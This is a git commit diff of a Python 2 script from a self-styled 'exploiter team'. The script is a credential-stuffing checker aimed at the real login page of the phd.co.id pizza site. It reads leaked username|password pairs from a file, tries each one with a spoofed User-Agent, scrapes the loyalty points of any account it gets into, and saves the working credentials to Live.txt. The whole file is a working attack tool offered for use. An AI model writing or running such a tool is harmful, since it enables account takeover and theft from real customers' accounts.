d97c900a7bdddce47bddf1254c32c019785ab6c2
jrdi14 <62805255+jrdi14@users.noreply.github.com>
2020-04-04 08:52:40 -0400

    Update phd.py

--- phd.py
+++ phd.py
@@ -1,4 +1,5 @@
-#!/usr/bin/python2
+
+	#!/usr/bin/python2
 
 # Creator :  ./FUKUR0-3XP
 # Team : Black Coders Satanic Exploiter Team ( BCA - X666X )
@@ -23,78 +24,89 @@ W = '\033[1;37m'
 A = '\033[90m'
 
 def banner():
-	print(''+C+'''
+  print(''+C+'''
    ___ _           _             ___ _  _ ___  
   / __| |_  ___ __| |_____ _ _  | _ \ || |   \ 
  | (__| ' \/ -_) _| / / -_) '_| |  _/ __ | |) |
   \___|_||_\___\__|_\_\___|_|   |_| |_||_|___/ 
-          '''+W+'Recode by Thanos  
+          '''+W+'Recode by thanos')
                    
-
-		empas = raw_input(''+C+'Masukkan File'+W+' ('+H+' Ex :'+C+' Empas.txt'+W+') : ')
-		print
-		print(''+C+'-------------- '+W+'Starting'+C+' --------------')
-		print
-		a = open(empas).readlines()
-		
-		for x in a:
-			
-			br = Browser()
-			cokie = cookielib.LWPCookieJar()
-			br.set_handle_equiv(True)
-			br.set_handle_gzip(True)
-			br.set_handle_redirect(True)
-			br.set_handle_referer(True)
-			br.set_handle_robots(False)
-			br.set_cookiejar(cokie)
-			
-			br.addheaders = [
-			
-			("Origin", "https://www.phd.co.id"),
-			("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10"),
-			("Referer", "https://www.phd.co.id/en/users/login/1"),
-			("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
-			
-			]
-			
-			us = x.strip().split('|')[0]
-			ps = x.strip().split('|')[1]
-			
-			url = 'https://www.phd.co.id/en/users/login/1'
-			
-			br.open(url)
-			br.select_form(nr=0)
-			br.form['username']=str(us)
-			br.form['password']=str(ps)
-			
-			a = live
-			
-			if br.submit().geturl() == 'https://www.phd.co.id/en/users/welcome':
-				x = br.open('https://www.phd.co.id/en/accounts').read()
-				y = Bs(x,'html.parser')
-				z = y.find('li', {'class' : 'owner-poin'}).text
-				
-				print(''+H+'['+W+'LIVE'+H+'] '+W+'USER : '+C+str(us)+W+' | '+W+'PASS : '+C+str(ps)+W+' POIN : '+str(z[6:]))
-				a.append('[ LIVE ] [ USER : '+str(us)+' | PASS : '+str(ps)+' ] [ POIN : '+str(z[6:])+' ] Checked On https://github.com/Fukur0-3XP/PHD')
-			
-			else:
-				print(''+A+'['+W+'ERROR'+A+'] '+W+'USER : '+C+str(us)+W+' | '+W+'PASS : '+C+str(ps))
-		
-		b = ('\n'.join(live))
-		c = open('Live.txt','w')
-		c.write(b)
-		print
-		print(''+C+'----------- '+W+'Selesai & Hasil'+C+' -----------')
-		print
-		print(W+'Hasil Live : '+C+str(len(live)))
-		print(W+'Hasil Tersimpan Di File "'+C+'Live.txt'+W+'"') 
-		print
-		c.close()
-	
-	except IOError:
-		print
-		print(M+'File Tidak Di Temukan !')
-		print
-	
+def main():
+  live = []
+  
+  os.system('clear')
+  print(C+'Facebook Gua'+W+'  Su !'+C+' :V')
+  sleep(1.5)
+  os.system('xdg-open https://www.facebook.com/parman.bae.1069')
+  os.system('clear')
+  banner()
+  print
+  print
+  try:
+    empas = raw_input(''+C+'Masukkan File'+W+' ('+H+' Ex :'+C+' Empas.txt'+W+') : ')
+    print
+    print(''+C+'-------------- '+W+'Starting'+C+' --------------')
+    print
+    a = open(empas).readlines()
+    
+    for x in a:
+      
+      br = Browser()
+      cokie = cookielib.LWPCookieJar()
+      br.set_handle_equiv(True)
+      br.set_handle_gzip(True)
+      br.set_handle_redirect(True)
+      br.set_handle_referer(True)
+      br.set_handle_robots(False)
+      br.set_cookiejar(cokie)
+      
+      br.addheaders = [
+      
+      ("Origin", "https://www.phd.co.id"),
+      ("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10"),
+      ("Referer", "https://www.phd.co.id/en/users/login/1"),
+      ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
+      
+      ]
+      
+      us = x.strip().split('|')[0]
+      ps = x.strip().split('|')[1]
+      
+      url = 'https://www.phd.co.id/en/users/login/1'
+      
+      br.open(url)
+      br.select_form(nr=0)
+      br.form['username']=str(us)
+      br.form['password']=str(ps)
+      
+      a = live
+      
+      if br.submit().geturl() == 'https://www.phd.co.id/en/users/welcome':
+        x = br.open('https://www.phd.co.id/en/accounts').read()
+        y = Bs(x,'html.parser')
+        z = y.find('li', {'class' : 'owner-poin'}).text
+        
+        print(''+H+'['+W+'LIVE'+H+'] '+W+'USER : '+C+str(us)+W+' | '+W+'PASS : '+C+str(ps)+W+' POIN : '+str(z[6:]))
+        a.append('[ LIVE ] [ USER : '+str(us)+' | PASS : '+str(ps)+' ] [ POIN : '+str(z[6:])+' ] Checked On https://github.com/Fukur0-3XP/PHD')
+      
+      else:
+        print(''+A+'['+W+'ERROR'+A+'] '+W+'USER : '+C+str(us)+W+' | '+W+'PASS : '+C+str(ps))
+    
+    b = ('\n'.join(live))
+    c = open('Live.txt','w')
+    c.write(b)
+    print
+    print(''+C+'----------- '+W+'Selesai & Hasil'+C+' -----------')
+    print
+    print(W+'Hasil Live : '+C+str(len(live)))
+    print(W+'Hasil Tersimpan Di File "'+C+'Live.txt'+W+'"') 
+    print
+    c.close()
+  
+  except IOError:
+    print
+    print(M+'File Tidak Di Temukan !')
+    print
+  
 if __name__ == '__main__':
-	main()
+  main()
